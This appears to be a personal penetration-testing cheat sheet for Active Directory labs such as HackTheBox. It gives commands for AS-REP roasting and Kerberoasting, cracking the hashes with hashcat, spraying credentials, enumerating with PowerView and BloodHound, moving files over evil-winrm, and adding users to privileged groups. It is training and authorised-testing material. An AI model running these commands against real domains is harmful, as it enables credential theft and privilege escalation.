# Tools

#### GetNPUsers

Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

```bash
GetNPUsers.py <DOMAIN.LOCAL>/administrator  # use other known usernames too
# Look for user/hash output

GetNPUsers.py -dc-ip <IP> -request 'htb.local/'
# Look for user/hash output
GetNPUsers.py -dc-ip <IP> -request 'htb.local/' -format hashcat  # Put it in hashcat format in prep to crack
# Hashcat Crack
hashcat -m 18200 hash.txt rockyou.txt -r rules/InsidePro-PasswordsPro.rule
# If cracked...
crackmapexec smb <IP> -u <user> -p <password>  # Look for Pwn3d!
crackmapexec smb <IP> -u <user> -p <password> --shares  # Check for SMB shares to access
```

#### GetUserSPNs

Queries target domain for SPNs that are running under a user account

```bash
GetUserSPNs.py -request -dc-ip <IP> active.htb/svc_tgs
# Check for kerberoasted output
# Crack found hashes then try to psexec
```



## PowerView

Cheat Sheet - [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Setup

```powershell
# Navigate to the directory PowerView is in
powershell -ep bypass  # load a powershell shell with execution policy bypassed
. .\PowerView.ps1  # import the PowerView module
```

### Example

```powershell
Get-NetComputer -fulldata | select operatingsystem  # gets a list of all operating systems on the domain
Get-NetUser | select cn  # gets a list of all users on the domain
Get-NetGroup  # Get groups
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}  # Get Kerberoastable user from a specified group
```

## evil-winrm

#### Connection

```bash
evil-winrm -u <user> -p <password> -i <IP>
```

#### Upload File to Target

```bash
# From compromised target
Evil-WinRM PS C:\Users\FSmith\Documents> upload winPEAS.exe
Evil-WinRM PS C:\Users\FSmith\Documents> .\winPEAS.exe
```

#### Download From from Target

```bash
# From compromised target
Evil-WinRM PS C:\Users\FSmith\Documents> download 123_BloodHound.zip
```

## Bloodhound / Sharphound

### Sharphound

Copy sharphound.exe to the target and run to gather information.

```powershell
.\SharpHound.exe -c all
# Will output a zip file to copy back to Kali

# Running remotely in PowerShell
.\SharphHound.exe -c all -d active.htb --domaincontroller <IP>
```

### Bloodhound

Run Bloodhound (and neo4j) then import zip file created by Sharphound

```bash
# Run neo4j first
sudo neo4j console/start
# Run Bloodhound
bloodhound --no-sandbox

# After importing, search on what you have owned
# Ex: search on username, right click and mark as owned
# Then navigate to Queries and look at Shortest Paths
# Look at Service accounts/Account Operators which have special permissions create accounts and put htem in different groups
# Ex: Create new user and add them to a group that has higher permissions; can't be Administrator gourp
net user <username> <password> /add/ domain
net group "Exchange Windows Permissions"  # Check for group members
net group "Exchange Windows Permissions" /add <username>  # Add user to group in quotes
# Then back in Bloodhound, right click group added (graph line) and look at Abuse Info.
# Will most likely use PowerView for the Abuse
```

#### bloodhound.py

```bash
python3.8 bloodhound.py -ns <IP> -d intelligence.htb -dc dc.intelligence.htb -u <username> -p <password> -c All
# Start neo4j an dupload the output to Bloodhoun
```

### neo4j

```bash
# neo4j new password/forgot password
locate no4j | grep auth
rm /usr/share/neo4j/data/dbms/auth
neo4j console
# Reset password
```
